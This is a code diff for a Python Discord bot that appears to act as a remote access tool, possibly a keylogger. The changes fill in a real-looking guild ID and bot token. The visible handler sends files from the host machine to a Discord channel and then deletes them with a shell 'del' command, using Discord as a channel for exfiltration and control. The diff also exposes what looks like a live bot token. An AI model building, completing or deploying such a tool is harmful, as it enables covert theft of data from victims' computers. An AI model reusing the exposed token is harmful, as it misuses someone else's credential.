@@ -5,7 +5,7 @@ load_dotenv()
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(8).hex()
-guild_id = "Here-the-Guild-ID"  
+guild_id = "1136420977287377027"  
 
 @client.event
 async def on_ready():
@@ -145,4 +145,4 @@ async def on_message(message):
             await message.channel.send("[*] Command successfuly executed", file=file)
             os.popen(f"del {file_keys}")
 
-client.run('Here-Bot-Token')
+client.run('MTEzNjQyODY5MzI4MDAxMDI0MQ.G02P3S.DPpNcyHGgbMSnafJe7ILAoJ0bJjiNXoor-jHPY')
